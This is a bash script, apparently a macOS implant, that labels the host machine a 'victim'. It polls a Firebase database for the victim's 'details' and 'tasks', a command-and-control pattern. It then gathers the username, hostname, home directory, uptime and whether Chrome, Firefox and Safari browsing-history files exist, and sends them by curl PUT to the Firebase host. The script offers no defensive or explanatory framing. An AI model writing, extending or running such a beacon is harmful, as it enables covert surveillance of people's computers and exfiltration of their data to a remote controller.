# REST API
# https://firebase.google.com/docs/reference/rest/database/

SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

victim="$1"
rootIteration="$2"

source "deploy"

iterationFile="$SCRIPTDIR/firebaseTest.iteration"
if [ ! -e "$iterationFile" ]; then
  echo "0" > "$iterationFile"
fi

iteration=`cat "$iterationFile"`
echo $((iteration + 1)) > "$iterationFile"

###############################################################################

function getVictimDetails(){

  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"

}

function getVictimTasks(){

  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/tasks.json"

}

function fileExists(){
  [[ -e "$1" ]]
  echo $((1 - $?))
}

function setVictimDetails(){
  local userName="$USER"
  local hostname=`"hostname"`
  local homedir="$HOME"
  local hasChromeHistory=`fileExists "$HOME/Library/Application Support/Google/Chrome/Default/History"`
  local hasFirefoxHistory=`fileExists "$(find $HOME'/Library/Application Support/Firefox/Profiles' | grep 'places.sqlite$')"`
  local hasSafariHistory=`fileExists "$HOME/Library/Safari/History.db"`
  local uptime="`uptime`"

  curl -X PUT -d "{
    \"iteration\" : \"$iteration\",
    \"userName\" : \"$userName\",
    \"hostname\" : \"$hostName\",
    \"homedir\" : \"$homedir\",
    \"hasChromeHistory\" : \"$hasChromeHistory\",
    \"hasFirefoxHistory\" : \"$hasFirefoxHistory\",
    \"hasSafariHistory\" : \"$hasSafariHistory\",
    \"uptime\" : \"$uptime\"
  }" \
  "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"
}

###############################################################################

getVictimDetails
setVictimDetails

# We only need to run this for a few seconds
